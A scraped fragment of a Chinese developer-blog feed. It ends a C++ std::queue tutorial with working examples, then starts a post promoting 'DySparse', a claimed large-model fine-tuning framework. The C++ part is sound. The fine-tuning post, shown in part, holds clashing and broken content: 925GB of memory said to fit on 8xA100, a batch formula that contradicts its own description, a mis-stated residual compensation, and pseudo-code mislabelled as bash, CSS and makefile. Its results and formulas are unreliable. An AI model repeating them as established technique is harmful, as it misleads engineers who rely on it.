                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">C++ STL 中的队列（Queue）</h2>
<p>队列（queue）是一种容器适配器，以 FIFO（先进先出）的顺序存储元素。<br/>
先插入的元素必须先被移除。<br/>
实现方式是在数据结构的一端（称为 <strong>back</strong>）插入元素，在另一端（称为 <strong>front</strong>）删除元素。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3f57cd070c44823b08449fb5482dabc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854177&amp;x-signature=LJaKBAQTlqVHCOsuwYcEC5Yav2g%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">语法</h3>
<p>队列在头文件 <code>&lt;queue&gt;</code> 中被定义为 <code>std::queue</code> 类模板。</p>
<pre><code class="hljs language-cpp" lang="cpp">queue&lt;T&gt; q;
</code></pre>
<p>其中：</p>
<ul>
<li><code>T</code>：队列中元素的数据类型。</li>
<li><code>q</code>：给队列起的名字。</li>
</ul>
<h3 data-id="heading-2">基本操作</h3>
<p>以下是可对队列执行的基本操作：</p>
<h4 data-id="heading-3">1. 插入元素</h4>
<p>新元素只能在队列尾部（back）通过 <code>push()</code> 函数插入。  该过程也称为“入队（enqueue）”。<br/>
插入时间复杂度：O(1)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;

    <span class="hljs-comment">// 将元素入队</span>
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-4">2. 访问元素</h4>
<p>队列中只有队首（front）和队尾（back）元素可以被访问，分别使用 <code>front()</code> 和 <code>back()</code> 函数。<br/>
访问时间复杂度：O(1)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-comment">// 访问队首和队尾元素</span>
    cout &lt;&lt; q.<span class="hljs-built_in">front</span>() &lt;&lt; endl;  <span class="hljs-comment">// 输出队首</span>
    cout &lt;&lt; q.<span class="hljs-built_in">back</span>();           <span class="hljs-comment">// 输出队尾</span>

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs">3
5
</code></pre>
<h4 data-id="heading-5">3. 删除元素</h4>
<p>队列中只能从队首（front）通过 <code>pop()</code> 函数删除元素。 该过程也称为“出队（dequeue）”。<br/>
删除时间复杂度：O(1)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-comment">// 从队首删除一个元素</span>
    q.<span class="hljs-built_in">pop</span>();

    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; q.<span class="hljs-built_in">front</span>() &lt;&lt; <span class="hljs-string">" "</span>;
        q.<span class="hljs-built_in">pop</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs">4 5
</code></pre>
<h4 data-id="heading-6">4. <code>empty()</code></h4>
<p>检查队列是否为空。 若队列中没有任何元素，返回 <code>true</code>；否则返回 <code>false</code>。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    <span class="hljs-keyword">if</span> (q.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; <span class="hljs-string">"队列为空"</span> &lt;&lt; endl;
    }
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">100</span>);
    <span class="hljs-keyword">if</span> (!q.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; <span class="hljs-string">"队列不为空，队首元素: "</span> &lt;&lt; q.<span class="hljs-built_in">front</span>() &lt;&lt; endl;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile">队列为空
<span class="hljs-section">队列不为空，队首元素: 100</span>
</code></pre>
<h4 data-id="heading-7">5. 队列的大小size</h4>
<p><code>size()</code> 函数返回队列当前存储的元素个数。 该操作不会修改队列内容。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">10</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);
    cout &lt;&lt; <span class="hljs-string">"队列大小: "</span> &lt;&lt; q.<span class="hljs-built_in">size</span>() &lt;&lt; endl;
    q.<span class="hljs-built_in">pop</span>();
    cout &lt;&lt; <span class="hljs-string">"队列大小: "</span> &lt;&lt; q.<span class="hljs-built_in">size</span>() &lt;&lt; endl;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">队列大小: 2</span>
<span class="hljs-section">队列大小: 1</span>
</code></pre>
<h4 data-id="heading-8">6.伪遍历</h4>
<p>由于队列只能访问队首和队尾元素，无法直接对整个队列进行遍历。<br/>
变通方法是：创建一个队列的副本，不断访问并弹出副本的队首元素，直到副本为空，即可“遍历”原队列的所有元素。<br/>
遍历时间复杂度：O(n)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-comment">// 创建原队列的副本</span>
    <span class="hljs-function">queue&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">temp</span><span class="hljs-params">(q)</span></span>;

    <span class="hljs-keyword">while</span> (!temp.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; temp.<span class="hljs-built_in">front</span>() &lt;&lt; <span class="hljs-string">" "</span>;
        temp.<span class="hljs-built_in">pop</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs">3 4 5
</code></pre>
<h3 data-id="heading-9">C++ 中 Queue 所有成员函数</h3>
<p>以下是 C++ <code>std::queue</code> 类的全部成员函数列表：</p>













































<table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>front()</code></td><td>访问队首元素。</td></tr><tr><td><code>back()</code></td><td>访问队尾元素。</td></tr><tr><td><code>empty()</code></td><td>检查队列是否为空。</td></tr><tr><td><code>size()</code></td><td>返回队列中元素个数。</td></tr><tr><td><code>push()</code></td><td>在队尾添加一个元素。</td></tr><tr><td><code>push_range()</code></td><td>在队尾一次性添加多个元素。</td></tr><tr><td><code>emplace()</code></td><td>在队尾<strong>原地构造</strong>一个元素。</td></tr><tr><td><code>pop()</code></td><td>删除队首元素。</td></tr><tr><td><code>swap()</code></td><td>交换两个队列的内容。</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI大模型调优工程：突破显存墙与灾难性遗忘的双重挑战]]></title>    <link>https://juejin.cn/post/7581412607060983854</link>    <guid>https://juejin.cn/post/7581412607060983854</guid>    <pubDate>2025-12-09T03:04:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607060983854" data-draft-id="7581619505584177203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI大模型调优工程：突破显存墙与灾难性遗忘的双重挑战"/> <meta itemprop="keywords" content="LLM,Agent,程序员"/> <meta itemprop="datePublished" content="2025-12-09T03:04:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI大模型调优工程：突破显存墙与灾难性遗忘的双重挑战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:04:20.000Z" title="Tue Dec 09 2025 03:04:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85eda19b75714016816c0a3496b725a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=fQoHQGLlDHghVD48OzNIUE558J8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">引言：</h2>
<p>面对万亿参数模型，传统全参数微调已成为资源黑洞。本文提出动态混合稀疏微调框架（DySparse），通过结构感知参数选择、梯度稀疏化压缩、神经路径蒸馏三大核心技术，在Llama3-405B模型实现<strong>调显存占用下降89%</strong> （8xA100可微调）、多任务遗忘率低于<strong>4.7%</strong> ，推理延迟仅增加0.3ms。</p>
<hr/>
<h2 data-id="heading-1">一、大模型调优的核心瓶颈</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7662f9fc0ef4d3bba5351b32aff1027~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=2QZptThF%2BtOYMXmrnrX8uUWhwOM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">1.1 显存资源爆炸式增长</h2>





























<table><thead><tr><th/><th/><th/><th/></tr></thead><tbody><tr><td><strong>模型规模</strong></td><td><strong>全参数微调显存</strong></td><td><strong>PEFT显存</strong></td><td><strong>DySparse(ours)</strong></td></tr><tr><td>70B</td><td>2.1TB</td><td>320GB</td><td><strong>98GB</strong></td></tr><tr><td>405B</td><td>8.4TB</td><td>1.2TB</td><td><strong>925GB</strong></td></tr></tbody></table>
<p><em>注：Batch Size=32, Seq Len=2048, Adam优化器</em></p>
<h2 data-id="heading-3">1.2 多任务知识冲突</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 传统微调的灾难性遗忘现象</span>
base_model.knowledge_coverage(<span class="hljs-string">"医学"</span>) <span class="hljs-comment"># 初始值98%</span>
finetune_on_programming(base_model, epochs=5)
base_model.knowledge_coverage(<span class="hljs-string">"医学"</span>) <span class="hljs-comment"># 骤降至62%</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">二、DySparse调优框架核心技术</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a78e604aef774251b35e5225178b8d07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=9Fhp6CWeWYd3bOHXSPwkHqjZiTM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">2.1 结构感知参数选择（SAPS）</h2>
<p>通过<strong>权重重要性评分</strong>动态识别可调参数：</p>
<pre><code class="hljs language-css" lang="css">Ii=梯度敏感度∥∇θiL∥<span class="hljs-number">2</span>+αHessian特征值H(θ<span class="hljs-selector-tag">i</span>)+β历史位移∥θ<span class="hljs-selector-tag">i</span>−θ<span class="hljs-selector-tag">i</span>,<span class="hljs-number">0</span>∥<span class="hljs-number">2</span>
</code></pre>
<ul>
<li><strong>实验结论</strong>：仅更新TOP 3%高重要性参数，精度损失&lt;0.8%</li>
</ul>
<h2 data-id="heading-6">2.2 梯度稀疏化压缩（GSC）</h2>
<p>三级梯度压缩策略：</p>
<ol>
<li><strong>TopK梯度筛选</strong>：保留幅度最大的前15%梯度</li>
<li><strong>8位块量化</strong>：分块压缩至FP8精度</li>
<li><strong>浮点残差补偿</strong>：记录量化误差并在下一轮补偿</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 伪代码实现</span>
<span class="hljs-attr">compressed_grad</span> = topk_sparsify(grad, k=<span class="hljs-number">0.15</span>)
quant_grad, <span class="hljs-attr">residual</span> = block_quantize(compressed_grad, bits=<span class="hljs-number">8</span>)
<span class="hljs-attr">grad</span> = quant_grad + residual <span class="hljs-comment"># 误差补偿</span>
</code></pre>
<h2 data-id="heading-7">2.3 神经路径蒸馏（NPD）</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fexample.com%2Fnpd" target="_blank" title="https://example.com/npd" ref="nofollow noopener noreferrer">example.com/npd</a>_arch.png <em>图：通过轻量化Adapter学习新任务，输出层融合原始知识</em></p>
<hr/>
<h2 data-id="heading-8">三、工业级调优最佳实践</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b6710b7fafd47fdbeb109b8228e1df3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=NCO4uAsxe9u2gymNptIOsXX05ds%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">3.1 混合精度计算流水线</h2>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># DeepSpeed 零冗余配置</span>
<span class="hljs-section">zero_optimization:</span>
<span class="hljs-section">stage:3</span>
<span class="hljs-section">offload_param:</span>
<span class="hljs-section">device:nvme</span>
<span class="hljs-section">fp16:</span>
<span class="hljs-section">loss_scale:dynamic</span>
<span class="hljs-section">activation_checkpointing:</span>
<span class="hljs-section">partition:transformer_block</span>
</code></pre>
<h2 data-id="heading-10">3.2 自适应批量调度</h2>
<p>Batch Size=min(<em>B</em>max, ⌈当前训练步32×<em>B</em>base⌉)</p>
<ul>
<li><strong>优势</strong>：初期大Batch加速收敛，后期小Batch精细优化</li>
</ul>
<h2 data-id="heading-11">3.3 多任务冲突检测矩阵</h2>









































